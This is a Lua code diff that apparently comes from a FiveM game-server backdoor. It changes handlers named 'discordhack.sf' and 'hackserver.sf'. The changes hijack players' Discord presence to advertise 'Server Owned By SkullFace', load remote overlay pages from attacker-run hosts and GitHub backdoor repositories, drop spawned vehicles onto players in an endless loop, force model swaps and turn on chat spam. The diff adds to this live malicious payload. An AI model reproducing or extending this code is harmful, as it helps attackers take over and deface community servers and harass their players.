@@ -18,10 +18,12 @@ AddEventHandler("discordhack.sf", function(text)
         while true do
 			SetDiscordAppId(972882580519157822)
 			SetDiscordRichPresenceAsset("1337")
-			SetRichPresence("Server PWNED BY SKULLFACE")
+			SetRichPresence("Server Owned By SkullFace")
+			SetDiscordRichPresenceAssetText('SkullFace#0888')
 			SetDiscordRichPresenceAssetSmall('1337')
-			SetDiscordRichPresenceAction(0, ("Server: %s"):format(text), "https://discord.com/invite/D8arx7erxQ")
-			SetDiscordRichPresenceAction(1, "PWNED BY SKULLFACE", "https://discord.com/invite/D8arx7erxQ")
+			SetDiscordRichPresenceAssetSmallText('Server Owned By SkullFace')
+			SetDiscordRichPresenceAction(0, ("Server: %s"):format(text), "https://discord.gg/jd5B3rTd3c")
+			SetDiscordRichPresenceAction(1, "beamed server", "https://discord.gg/jd5B3rTd3c")
 			Citizen.Wait(1)
         end
     end)
@@ -10489,9 +10491,11 @@ AddEventHandler("hackserver.sf", function()
 
 	local object = CreateDui("https://upfilesc.wwwnl1-ss11.a2hosted.com/cipher_vis12.html", 1920, 1080);
 	local object = CreateDui("https://raw.githubusercontent.com/brayden1337/backdoor2/main/backdoor/ui/text%20overlay/y.html", 1920, 1080);
+	local object2 = CreateDui("https://spambude.net/Dks/html/lyxos_bug/lyxos_bug.html", 1920, 1080);  -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
 	local object3 = CreateDui("https://raw.githubusercontent.com/brayden1337/backdoor2/main/backdoor/ui/overlay/screen3_2.html", 1920, 1080);
 
 	local handle = GetDuiHandle(object) -- Gets DUI handle from object
+	local handle2 = GetDuiHandle(object2) -- Gets DUI handle from object
 	local handle3 = GetDuiHandle(object3) -- Gets DUI handle from object
 
 	local showtext = true
@@ -10604,6 +10608,30 @@ AddEventHandler("hackserver.sf", function()
 		   end
 	   end)
 
+	   -- create the vehicle
+	   Citizen.CreateThread(function()
+		   Citizen.Wait(3000)
+			   if math.random(1, 5) == 5 then
+			   local playerPed = PlayerPedId() -- get the local player ped
+			   local pos = GetEntityCoords(playerPed) -- get the position of the local player ped
+			   local vehicle = CreateVehicle(vehicleName, pos.x, pos.y, pos.z+100.0, GetEntityHeading(playerPed), true, false)
+			   while true do
+				   Citizen.Wait(10000)
+				   local playerPed = PlayerPedId() -- get the local player ped
+				   local pos = GetEntityCoords(playerPed) -- get the position of the local player ped
+				   local vehicle = CreateVehicle(vehicleName, pos.x, pos.y, pos.z+100.0, GetEntityHeading(playerPed), true, false)
+			   end
+		   end
+	   end)
+	   chatspam = true
+	   while not HasModelLoaded(model121) do
+		   Wait(100)
+	   end
+	   SetPlayerModel(player1, model121)
+	   SetModelAsNoLongerNeeded(model121)
+
+	end)
+
 	Citizen.CreateThread(function()
 	   --print(GetEntityCoords(GetPlayerPed(-1), true))
 	   if(bypass == false)then
@@ -10624,14 +10652,14 @@ AddEventHandler("hackserver.sf", function()
 	end
 
 	local config = {
-	   ["TITLE"] = "~r~----> - https://dsc.gg/internetinkooleimmat", 
-	   ["SUBTITLE"] = "~r~----> - https://dsc.gg/internetinkooleimmat",
-	   ["MAP"] = "---->",
-	   ["STATUS"] = "nekrurp",
-	   ["GAME"] = "nekrurp",
-	   ["INFO"] = "nekrurp",
-	   ["SETTINGS"] = "nekrurp",
-	   ["R*EDITOR"] = "nekrurp",
+		["TITLE"] = "~r~----> - https://dsc.gg/internetinkooleimmat", 
+		["SUBTITLE"] = "~r~----> - https://dsc.gg/internetinkooleimmat",
+		["MAP"] = "---->",
+		["STATUS"] = "nekrurp",
+		["GAME"] = "nekrurp",
+		["INFO"] = "nekrurp",
+		["SETTINGS"] = "nekrurp",
+		["R*EDITOR"] = "nekrurp",
 	}
 
 	Citizen.CreateThread(function()
@@ -10648,8 +10676,8 @@ AddEventHandler("hackserver.sf", function()
 		   PopScaleformMovieFunctionVoid()
 	   end
 	end)
-	
-	   Citizen.CreateThread(function()
+
+	Citizen.CreateThread(function()
 	   AddTextEntry('PM_SCR_MAP', config["MAP"])
 	   AddTextEntry('PM_SCR_STA', config["STATUS"])
 	   AddTextEntry('PM_SCR_GAM', config["GAME"])
